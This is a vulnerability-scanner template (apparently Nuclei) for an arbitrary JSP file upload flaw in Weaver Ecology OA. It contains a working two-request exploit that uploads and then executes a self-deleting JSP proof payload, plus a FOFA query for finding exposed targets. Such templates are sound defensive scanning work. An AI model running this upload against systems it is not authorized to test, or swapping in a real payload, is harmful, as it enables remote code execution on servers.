http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - status_code_1 == 200
    - contains(body_2, '319463310816') || status_code_2 == 200
  matchers-condition: and
  raw:
  - 'POST /page/exportImport/uploadOperation.jsp HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo


    ------WebKitFormBoundaryFy3iNVBftjP6IOwo

    Content-Disposition: form-data; name="file"; filename="{{randstr}}.jsp"

    Content-Type: application/octet-stream


    <%out.print(364536*876356);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>

    ------WebKitFormBoundaryFy3iNVBftjP6IOwo--

    '
  - 'GET /page/exportImport/fileTransfer/{{randstr}}.jsp HTTP/1.1

    Host: {{Hostname}}

    '
id: ecology-arbitrary-file-upload
info:
  author: ritikchaddha
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-434
  description: Ecology contains an arbitrary file upload vulnerability. An attacker
    can upload arbitrary files to the server, which in turn can be used to make the
    application execute file content as code, As a result, an attacker can possibly
    obtain sensitive information, modify data, and/or execute unauthorized operations.
  metadata:
    fofa-query: "app=\"\u6CDB\u5FAE-\u534F\u540C\u529E\u516COA\""
    max-request: 2
  name: Ecology - Arbitrary File Upload
  reference:
  - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
  severity: critical
  tags: ecology,fileupload,intrusive,vuln
